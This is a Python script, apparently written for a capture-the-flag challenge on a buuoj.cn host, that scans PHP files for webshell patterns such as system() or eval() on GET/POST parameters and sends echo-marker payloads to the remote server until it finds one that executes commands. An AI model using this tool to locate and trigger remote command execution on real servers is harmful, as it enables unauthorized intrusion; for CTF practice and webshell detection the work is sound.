#!/usr/bin/env python3
"""
动态测试webshell - 发送唯一标记，检查响应
"""
import os
import re
import requests
import time
import random
import string

BASE_URL = "http://01de7a39-b84f-4e29-afb6-cc13ed331efc.node5.buuoj.cn:81"
SRC_DIR = "src"
DELAY = 0.3

def generate_marker():
    """生成唯一标记"""
    return ''.join(random.choices(string.ascii_uppercase, k=8))

def test_shell(php_file, method, func, param):
    """测试单个shell"""
    marker = generate_marker()
    url = f"{BASE_URL}/{php_file}"
    
    try:
        if method == 'GET':
            if func in ['system', 'exec', 'passthru', 'shell_exec']:
                payload = {param: f'echo {marker}'}
            elif func == 'eval':
                payload = {param: f'echo "{marker}";'}
            elif func == 'assert':
                payload = {param: f'print("{marker}");'}
            else:
                payload = {param: f'echo {marker}'}
            
            r = requests.get(url, params=payload, timeout=10)
        else:
            if func in ['system', 'exec', 'passthru', 'shell_exec']:
                payload = {param: f'echo {marker}'}
            elif func == 'eval':
                payload = {param: f'echo "{marker}";'}
            elif func == 'assert':
                payload = {param: f'print("{marker}");'}
            else:
                payload = {param: f'echo {marker}'}
            
            r = requests.post(url, data=payload, timeout=10)
        
        if r.status_code == 429:
            print(f"[429] Rate limited, sleeping 30s...")
            time.sleep(30)
            return None
        
        if marker in r.text:
            return True, marker
        return False, marker
        
    except Exception as e:
        return None, str(e)

def main():
    php_files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    
    patterns = [
        (r"system\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'system'),
        (r"system\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'system'),
        (r"eval\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'eval'),
        (r"eval\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'eval'),
        (r"exec\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'exec'),
        (r"exec\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'exec'),
        (r"assert\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'assert'),
        (r"assert\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'assert'),
    ]
    
    tested = 0
    found = []
    
    for php_file in php_files:
        filepath = os.path.join(SRC_DIR, php_file)
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
        
        for pattern, method, func in patterns:
            matches = re.findall(pattern, content)
            for param in matches:
                result, marker = test_shell(php_file, method, func, param)
                tested += 1
                
                if result:
                    print(f"\n[+] FOUND: {php_file} - {method} {func}({param})")
                    print(f"    Marker: {marker}")
                    found.append((php_file, method, func, param))
                    return found
                
                if tested % 100 == 0:
                    print(f"[*] Tested {tested} shells...")
                
                time.sleep(DELAY)
    
    print(f"\n[*] Tested {tested} shells, found {len(found)} working")
    return found

if __name__ == "__main__":
    shells = main()
    if shells:
        print(f"\n[+] Working shells:")
        for s in shells:
            print(f"    {s}")
